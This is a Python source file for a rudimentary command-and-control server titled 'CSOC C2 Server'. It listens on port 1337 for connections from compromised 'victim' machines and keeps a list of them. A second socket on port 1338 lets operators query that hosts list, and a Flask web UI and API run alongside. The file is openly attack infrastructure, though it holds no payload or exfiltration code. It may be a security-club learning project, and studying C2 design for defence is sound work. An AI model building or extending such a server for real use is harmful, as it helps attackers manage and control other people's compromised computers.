from rich import print as rprint
import common
import commands
import controllers.api
import controllers.views
import datetime
import flask
import threading
import socket
import signal
import sys


def handle_victim_connection(conn, ip):
    common.num_hosts += 1
    with common.lock:
        common.sockets.append(conn)
        common.hosts.append((ip, conn, "1"))

    rprint(f"[bold green]Connected by {ip}")

    common.send_msg(conn, duck.encode())


def handle_user_connection(conn, ip):
    rprint(f"[bold green] Connected by {ip}")

    common.send_msg(conn, duck.encode())

    msg = conn.recv(1024).decode()
    #act as echo server
    while msg != 'quit' and len(msg) != 0: 
        rprint("Received_data: [green]%s" % msg)
        if msg == 'hosts':
            commands.send_hosts_table(conn, common.hosts)
        else:
            conn.send(msg.encode())
        msg = conn.recv(1024).decode()
    conn.close()
    rprint("[red]Connection Closed: %s" %str(ip))

    # TODO if user disconnects close thread and socket
        


def listen_for_victim_connections():
    try:
        while True:
            # create a dedicated thread for each incoming connection
            vic_conn, vic_addr = vs.accept()
            
            t = threading.Thread(target=handle_victim_connection, args=(vic_conn, vic_addr))
            t.start()
    except Exception as e:
        rprint("[red]Error: %s" % str(e))
        [sock.close() for sock in common.sockets]


def listen_for_user_connections():
    try:
        while True:
            # create a dedicated thread for each incoming connection
            user_conn, user_addr = us.accept()
            
            t = threading.Thread(target=handle_user_connection, args=(user_conn, user_addr))
            t.start()
    except Exception as e:
        rprint("[red]Error: %s" % str(e))
        [sock.close() for sock in common.sockets]


# Handle interrupts to cleanup sockets
# def sigint_handler(signal, frame):
#     with common.lock:
#         [sock.close() for sock in common.sockets]
#     sys.exit(0)


# run web ui and handle client connections
if __name__ == '__main__':
    common.hosts = []
    common.sockets = []

    # load ascii art
    file = open('../art/duck.ansi', 'r')
    duck = file.read()
    file.close()

    # setup socket for victim
    victim_server_addr = ("0.0.0.0", 1337)

    # setup socket for user communication
    user_server_addr = ("0.0.0.0", 1338)

    vs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vs.bind(victim_server_addr)
    vs.listen(5)

    us = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    us.bind(user_server_addr)
    us.listen(5)

    print('CSOC C2 Server')
    threading.Thread(target=lambda: listen_for_victim_connections()).start()
    threading.Thread(target=lambda: listen_for_user_connections()).start()

    flask_app = flask.Flask(__name__)
    flask_app.register_blueprint(controllers.views.view_routes)
    flask_app.register_blueprint(controllers.api.api_routes)
    flask_app.run()

    #signal.signal(signal.SIGINT, sigint_handler)
